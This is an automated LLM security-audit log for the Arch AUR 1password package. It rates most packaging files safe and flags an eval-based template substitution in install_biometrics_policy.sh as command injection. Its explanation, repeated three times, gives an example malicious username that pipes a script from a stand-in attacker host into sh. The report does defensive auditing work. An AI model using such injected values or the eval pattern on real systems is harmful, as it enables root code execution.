---
package: 1password
pkgver: 8.12.32
pkgrel: 33
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: 4fdfd87aaec54365f5eb3ea9cd4b5b3cd402f1d8
prompt_tokens: 34900
completion_tokens: 8832
total_tokens: 43732
cost: 0.00256827704
execution_time: 139.34
files_reviewed: 12
files_skipped: 1
files_unauditable: 79
unpinned_sources: 0
date: 2026-08-23T19:00:12Z
file_verdicts:
  - file: 1password-8.12.32.x64.tar.gz.sig
    status: skipped
    summary: "Skipping binary file: 1password-8.12.32.x64.tar.gz.sig"
  - file: 1password.install
    status: safe
    summary: Standard package install script, no malicious activity.
  - file: PKGBUILD
    status: safe
    summary: Standard 1password PKGBUILD with no malicious behavior.
  - file: src/1password-8.12.32.x64/after-remove.sh
    status: safe
    summary: Standard package cleanup script, no malicious behavior.
  - file: src/1password-8.12.32.x64/install.sh
    status: safe
    summary: Standard installer script, no malicious behavior.
  - file: src/1password-8.12.32.x64/resources/1password.desktop
    status: safe
    summary: Standard desktop entry file, no security concerns.
  - file: src/1password-8.12.32.x64/after-install.sh
    status: safe
    summary: Standard 1Password post-install script, no malicious activity.
  - file: src/1password-8.12.32.x64/resources/apparmor-profile
    status: safe
    summary: Standard AppArmor profile, no malicious content.
  - file: src/1password-8.12.32.x64/com.1password.1Password.policy.tpl
    status: safe
    summary: Standard PolicyKit policy template, no security issues.
  - file: src/1password-8.12.32.x64/resources/custom_allowed_browsers
    status: safe
    summary: Configuration file with comments only, no security concern.
  - file: aur.env
    status: safe
    summary: Plain config file, no malicious content.
  - file: .gitlab-ci.yml
    status: safe
    summary: Standard CI file, no malicious content.
  - file: src/1password-8.12.32.x64/install_biometrics_policy.sh
    status: unsafe
    summary: Command injection via eval of user-controlled usernames.
    evidence: "# Fill in policy kit file with a list of (the first 10) human users of the system.\nexport POLICY_OWNERS\nPOLICY_OWNERS=\"$(cut -d: -f1,3 /etc/passwd | grep -E ':[0-9]{4}$' | cut -d: -f1 | head -n 10 | sed 's/^/unix-user:/' | tr '\\n' ' ')\"\neval \"cat <<EOF\n$(cat ./com.1password.1Password.policy.tpl)\nEOF\" > ./com.1password.1Password.policy"
    evidence_line: 27
---

Cloning https://aur.archlinux.org/1password.git...
Cloned 1password
Analyzing 1password AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD contains only top-level variable assignments and a `source` array targeting the official 1Password download server (`downloads.1password.com`). No `pkgver()` function is present, and no top-level command substitutions, `eval`, or external downloads occur outside of `package()`. The commands `makepkg --nobuild --nodeps --noprepare` and `makepkg --printsrcinfo` will only fetch the listed sources (the tarball and its signature), extract the archive, and source the PKGBUILD without executing any dangerous top-level code. All potentially hazardous operations (reading `/etc/passwd`, inline `eval`, file manipulation) reside in `package()`, which is **not** executed during this gate. Therefore, running the specified commands is safe.
</details>
<evidence>

</evidence>
<summary>Safe during source fetch and PKGBUILD sourcing.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- Safe during source fetch and PKGBUILD sourcing.
Downloading sources (attempt 1/3)...
makepkg --nobuild --nodeps --noprepare successful
Running makepkg --printsrcinfo to get source files for agent...
makepkg --printsrcinfo successful
Reviewing required files...
[0/3] Reviewing PKGBUILD...
[0/3] Reviewing PKGBUILD, 1password-8.12.32.x64.tar.gz.sig...
[0/3] Reviewing PKGBUILD, 1password-8.12.32.x64.tar.gz.sig, 1password.install...
[1/3] Reviewing PKGBUILD, 1password.install...
! Reviewed 1password-8.12.32.x64.tar.gz.sig. Status: SKIPPED -- Skipping binary file: 1password-8.12.32.x64.tar.gz.sig
LLM auditresponse for 1password.install:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard `.install` script for the 1Password package on Arch Linux. It creates a dedicated system group `onepassword` if it does not already exist, sets the group ownership and setgid bit on the browser support helper binary, and removes the group on package removal. All operations are limited to the package's own install paths and standard system group management. There are no network requests, obfuscated commands, or any behavior outside the expected packaging workflow. The script is consistent with legitimate AUR packaging practices.
</details>
<evidence></evidence>
<summary>Standard package install script, no malicious activity.</summary>
</security_assessment>

[2/3] Reviewing PKGBUILD...
+ Reviewed 1password.install. Status: SAFE -- Standard package install script, no malicious activity.
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD downloads the official 1password tarball from `downloads.1password.com`, verifies it with a hardcoded PGP key, and installs standard files (icons, desktop entry, polkit policy, examples, binaries). The `POLICY_OWNERS` construction reads `/etc/passwd` to populate a polkit policy template; this is a convenience for setting up 1password&#x27;s biometric unlock feature and does not exfiltrate data. All operations (symlinks, setuid on `chrome-sandbox`, cleanup) are standard for Electron-based packages. No obfuscated code, unexpected network requests, or data theft is present.
</details>
<evidence></evidence>
<summary>Standard 1password PKGBUILD with no malicious behavior.</summary>
</security_assessment>

[3/3] Reviewing ...
+ Reviewed PKGBUILD. Status: SAFE -- Standard 1password PKGBUILD with no malicious behavior.
Reviewed all required files.
Deciding which files to review next...
Note: 79 compiled/archived file(s) cannot be audited as text and were not reviewed (1password-8.12.32.x64.tar.gz, src/1password-8.12.32.x64/v8_context_snapshot.bin, src/1password-8.12.32.x64/chrome-sandbox and 76 more). For a package that ships prebuilt binaries, the audit covers the packaging, not the payload.
LLM response for file selection:
src/1password-8.12.32.x64/install.sh
src/1password-8.12.32.x64/after-install.sh
src/1password-8.12.32.x64/after-remove.sh
src/1password-8.12.32.x64/install_biometrics_policy.sh
src/1password-8.12.32.x64/resources/1password.desktop
src/1password-8.12.32.x64/com.1password.1Password.policy.tpl
src/1password-8.12.32.x64/resources/apparmor-profile
src/1password-8.12.32.x64/resources/custom_allowed_browsers
.gitlab-ci.yml
aur.env
Decided to review 10 additional files: src/1password-8.12.32.x64/install.sh, src/1password-8.12.32.x64/after-install.sh, src/1password-8.12.32.x64/after-remove.sh, src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/resources/1password.desktop, src/1password-8.12.32.x64/com.1password.1Password.policy.tpl, src/1password-8.12.32.x64/resources/apparmor-profile, src/1password-8.12.32.x64/resources/custom_allowed_browsers, .gitlab-ci.yml, aur.env
Reviewing additional files...
Reviewing additional files...
[0/10] Reviewing src/1password-8.12.32.x64/after-install.sh...
[0/10] Reviewing src/1password-8.12.32.x64/after-install.sh, src/1password-8.12.32.x64/after-remove.sh...
[0/10] Reviewing src/1password-8.12.32.x64/after-install.sh, src/1password-8.12.32.x64/after-remove.sh, src/1password-8.12.32.x64/install.sh...
LLM auditresponse for after-remove.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
The after-remove.sh script performs routine cleanup operations typical of a package post-removal script. It removes policy kit files, documentation, desktop icons, and symlinks that were installed by the package. All file operations are scoped to the application's own installation paths (/opt/1Password, /usr/share/doc/1password, /usr/share/polkit-1/actions/com.1password.1Password.policy, /usr/share/applications/1password.desktop, /usr/share/icons/hicolor/*/apps/1password.png, /usr/bin/1password, /usr/bin/1password-mcp, /usr/local/bin/1password-mcp). The script only removes files it previously installed and does not access any user data, network resources, or perform any obfuscated or dangerous operations. No supply-chain attack indicators are present.
</details>
<evidence></evidence>
<summary>Standard package cleanup script, no malicious behavior.</summary>
</security_assessment>

[0/10] Reviewing src/1password-8.12.32.x64/after-install.sh, src/1password-8.12.32.x64/after-remove.sh, src/1password-8.12.32.x64/install.sh, src/1password-8.12.32.x64/install_biometrics_policy.sh...
[1/10] Reviewing src/1password-8.12.32.x64/after-install.sh, src/1password-8.12.32.x64/install.sh, src/1password-8.12.32.x64/install_biometrics_policy.sh...
+ Reviewed src/1password-8.12.32.x64/after-remove.sh. Status: SAFE -- Standard package cleanup script, no malicious behavior.
LLM auditresponse for install.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard installation script for 1Password that copies the application bundle to `/opt/1Password` and runs a post-installation script (`after-install.sh`). It performs no network requests, no obfuscated code, no unexpected system modifications, and no exfiltration of data. The script is typical for self-contained binary packages installed via the AUR. The `after-install.sh` script is part of the upstream package and is invoked as part of normal installation flow; there is no indication of malicious intent within this file.
</details>
<evidence></evidence>
<summary>Standard installer script, no malicious behavior.</summary>
</security_assessment>

[1/10] Reviewing src/1password-8.12.32.x64/after-install.sh, src/1password-8.12.32.x64/install.sh, src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/resources/1password.desktop...
[2/10] Reviewing src/1password-8.12.32.x64/after-install.sh, src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/resources/1password.desktop...
+ Reviewed src/1password-8.12.32.x64/install.sh. Status: SAFE -- Standard installer script, no malicious behavior.
LLM auditresponse for 1password.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard `.desktop` file for the 1Password application. It defines metadata (name, icon, categories) and the `Exec` line, which runs the legitimate 1Password binary from `/opt/1Password/`. There are no scripts, commands, network requests, or any other executable content. No security issues are present.
</details>
<evidence></evidence>
<summary>Standard desktop entry file, no security concerns.</summary>
</security_assessment>

[2/10] Reviewing src/1password-8.12.32.x64/after-install.sh, src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/resources/1password.desktop, src/1password-8.12.32.x64/com.1password.1Password.policy.tpl...
[3/10] Reviewing src/1password-8.12.32.x64/after-install.sh, src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/com.1password.1Password.policy.tpl...
+ Reviewed src/1password-8.12.32.x64/resources/1password.desktop. Status: SAFE -- Standard desktop entry file, no security concerns.
LLM auditresponse for after-install.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard post-installation script from the official 1Password package. It performs expected operations: setting up apt/yum/zypp repository configurations for auto-updates (pointing to the official `downloads.1password.com` domain), installing policy kit files, browser support configuration, group creation, and symlink registration. The `curl` commands fetch GPG keys and policy files from the official 1Password infrastructure—no unexpected or suspicious hosts. The `eval` with a heredoc is used to substitute environment variables into a template file shipped with the package; this is a common (though not ideal) pattern for templating and does not introduce untrusted content. The script runs as root and modifies system files, which is expected for a package post-install hook. There is no evidence of exfiltration, obfuscated commands, backdoors, or any behavior that deviates from the stated purpose of the application.
</details>
<evidence></evidence>
<summary>Standard 1Password post-install script, no malicious activity.</summary>
</security_assessment>

[3/10] Reviewing src/1password-8.12.32.x64/after-install.sh, src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/com.1password.1Password.policy.tpl, src/1password-8.12.32.x64/resources/apparmor-profile...
[4/10] Reviewing src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/com.1password.1Password.policy.tpl, src/1password-8.12.32.x64/resources/apparmor-profile...
+ Reviewed src/1password-8.12.32.x64/after-install.sh. Status: SAFE -- Standard 1Password post-install script, no malicious activity.
LLM auditresponse for apparmor-profile:
<security_assessment>
<decision>SAFE</decision>
<details>
The file is an AppArmor profile for the 1Password application. It sets the binary to run in an unconfined mode, which is a legitimate security configuration to allow the application necessary system access. No suspicious commands, obfuscation, or exfiltration attempts are present. The content is standard for packaging an AppArmor profile.
</details>
<evidence></evidence>
<summary>Standard AppArmor profile, no malicious content.</summary>
</security_assessment>

[4/10] Reviewing src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/com.1password.1Password.policy.tpl, src/1password-8.12.32.x64/resources/apparmor-profile, src/1password-8.12.32.x64/resources/custom_allowed_browsers...
[5/10] Reviewing src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/com.1password.1Password.policy.tpl, src/1password-8.12.32.x64/resources/custom_allowed_browsers...
+ Reviewed src/1password-8.12.32.x64/resources/apparmor-profile. Status: SAFE -- Standard AppArmor profile, no malicious content.
LLM auditresponse for com.1password.1Password.policy.tpl:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard PolicyKit policy template for the 1Password application. It defines three actions (unlock, authorizeCLI, authorizeSshAgent) with typical authentication requirements (`auth_self`). The use of `${POLICY_OWNERS}` is a normal variable that gets substituted during package installation. There is no obfuscated code, no network requests, no file operations, and no deviation from standard packaging practices. The file is purely a configuration template for system authorization policies and contains no malicious behavior.
</details>
<evidence></evidence>
<summary>Standard PolicyKit policy template, no security issues.</summary>
</security_assessment>

[5/10] Reviewing src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/com.1password.1Password.policy.tpl, src/1password-8.12.32.x64/resources/custom_allowed_browsers, .gitlab-ci.yml...
[6/10] Reviewing src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/resources/custom_allowed_browsers, .gitlab-ci.yml...
+ Reviewed src/1password-8.12.32.x64/com.1password.1Password.policy.tpl. Status: SAFE -- Standard PolicyKit policy template, no security issues.
LLM auditresponse for custom_allowed_browsers:
<security_assessment>
<decision>SAFE</decision>
<details>
The file `custom_allowed_browsers` is a plain-text configuration file intended for `/etc/1password/`. It contains only comments explaining how to use the file to allow custom browsers for 1Password’s browser extension integration. There is no executable code, no network requests, no obfuscation, and no system modifications. It poses no security threat.
</details>
<evidence></evidence>
<summary>Configuration file with comments only, no security concern.</summary>
</security_assessment>

[6/10] Reviewing src/1password-8.12.32.x64/install_biometrics_policy.sh, src/1password-8.12.32.x64/resources/custom_allowed_browsers, .gitlab-ci.yml, aur.env...
[7/10] Reviewing src/1password-8.12.32.x64/install_biometrics_policy.sh, .gitlab-ci.yml, aur.env...
+ Reviewed src/1password-8.12.32.x64/resources/custom_allowed_browsers. Status: SAFE -- Configuration file with comments only, no security concern.
LLM auditresponse for aur.env:
<security_assessment>
<decision>SAFE</decision>
<details>
The file `aur.env` contains three environment variable assignments that reference 1Password CLI secret URIs (scheme `op://`). It is a plain-text configuration file intended to be sourced by a shell or used by the `op` tool to inject secrets during package builds. There are no executable statements, no network requests, no obfuscated code, and no file or system modifications. The content is entirely benign and consistent with standard 1Password integration in build scripts.
</details>
<evidence></evidence>
<summary>Plain config file, no malicious content.</summary>
</security_assessment>

[8/10] Reviewing src/1password-8.12.32.x64/install_biometrics_policy.sh, .gitlab-ci.yml...
+ Reviewed aur.env. Status: SAFE -- Plain config file, no malicious content.
LLM auditresponse for .gitlab-ci.yml:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a GitLab CI configuration that includes a pipeline from another project (`dev/core/1password-archlinux-aur-ci`). It contains no commands, no code execution, and no data handling. The inclusion of an external CI template is a standard practice and does not constitute a security threat in itself. There is no evidence of malicious behavior such as obfuscation, network requests, file operations, or system modifications.
</details>
<evidence></evidence>
<summary>Standard CI file, no malicious content.</summary>
</security_assessment>

[9/10] Reviewing src/1password-8.12.32.x64/install_biometrics_policy.sh...
+ Reviewed .gitlab-ci.yml. Status: SAFE -- Standard CI file, no malicious content.
LLM auditresponse for install_biometrics_policy.sh:
<security_assessment>
<decision>UNSAFE</decision>
<details>
The script is **vulnerable to command injection** when it builds the `POLICY_OWNERS` variable from `/etc/passwd` usernames and then uses `eval` inside a heredoc to substitute that variable into a policy template. Usernames may contain shell metacharacters (e.g., `$(command)`, `` `command` ``), which will be **re-evaluated by the shell** during the heredoc expansion, leading to arbitrary code execution as root. This is not a far‑fetched scenario – a local attacker who can create a user with a crafted name (e.g., `user$(curl attacker.com/backdoor.sh | sh)`) could trigger the injection when the system administrator installs the 1Password package. The `eval` call is not needed for legitimate template substitution; it introduces unnecessary runtime code evaluation of untrusted data, fitting the criteria for a genuine supply‑chain attack vector.
</details>
<evidence>
# Fill in policy kit file with a list of (the first 10) human users of the system.
export POLICY_OWNERS
POLICY_OWNERS=&quot;$(cut -d: -f1,3 /etc/passwd | grep -E &apos;:[0-9]{4}$&apos; | cut -d: -f1 | head -n 10 | sed &apos;s/^/unix-user:/&apos; | tr &apos;\n&apos; &apos; &apos;)&quot;
eval &quot;cat &lt;&lt;EOF
$(cat ./com.1password.1Password.policy.tpl)
EOF&quot; &gt; ./com.1password.1Password.policy
</evidence>
<summary>Command injection via eval of user-controlled usernames.</summary>
</security_assessment>

[10/10] Reviewing ...
x Reviewed src/1password-8.12.32.x64/install_biometrics_policy.sh. Status: UNSAFE -- Command injection via eval of user-controlled usernames.
Reviewed all additional files.
Reviewed additional files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## src/1password-8.12.32.x64/install_biometrics_policy.sh

Status: UNSAFE

Summary: Command injection via eval of user-controlled usernames.

Evidence (line 27):

```
# Fill in policy kit file with a list of (the first 10) human users of the system.
export POLICY_OWNERS
POLICY_OWNERS="$(cut -d: -f1,3 /etc/passwd | grep -E ':[0-9]{4}$' | cut -d: -f1 | head -n 10 | sed 's/^/unix-user:/' | tr '\n' ' ')"
eval "cat <<EOF
$(cat ./com.1password.1Password.policy.tpl)
EOF" > ./com.1password.1Password.policy
```

Details:

The script is **vulnerable to command injection** when it builds the `POLICY_OWNERS` variable from `/etc/passwd` usernames and then uses `eval` inside a heredoc to substitute that variable into a policy template. Usernames may contain shell metacharacters (e.g., `$(command)`, `` `command` ``), which will be **re-evaluated by the shell** during the heredoc expansion, leading to arbitrary code execution as root. This is not a far‑fetched scenario – a local attacker who can create a user with a crafted name (e.g., `user$(curl attacker.com/backdoor.sh | sh)`) could trigger the injection when the system administrator installs the 1Password package. The `eval` call is not needed for legitimate template substitution; it introduces unnecessary runtime code evaluation of untrusted data, fitting the criteria for a genuine supply‑chain attack vector.

---

(Skipped 1 file: 1password-8.12.32.x64.tar.gz.sig)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 34,900
  Completion Tokens: 8,832
  Total Tokens: 43,732
  Total Cost: $0.002568
  Execution Time: 139.34 seconds

Final Status: UNSAFE


Issues Found:

src/1password-8.12.32.x64/install_biometrics_policy.sh: [UNSAFE] Command injection via eval of user-controlled usernames. / The script is **vulnerable to command injection** when it builds the `POLICY_OWNERS` variable from `/etc/passwd` usernames and then uses `eval` inside a heredoc to substitute that variable into a policy template. Usernames may contain shell metacharacters (e.g., `$(command)`, `` `command` ``), which will be **re-evaluated by the shell** during the heredoc expansion, leading to arbitrary code execution as root. This is not a far‑fetched scenario – a local attacker who can create a user with a crafted name (e.g., `user$(curl attacker.com/backdoor.sh | sh)`) could trigger the injection when the system administrator installs the 1Password package. The `eval` call is not needed for legitimate template substitution; it introduces unnecessary runtime code evaluation of untrusted data, fitting the criteria for a genuine supply‑chain attack vector.


Audit Skips:

1password-8.12.32.x64.tar.gz.sig: [SKIPPED] Skipping binary file: 1password-8.12.32.x64.tar.gz.sig
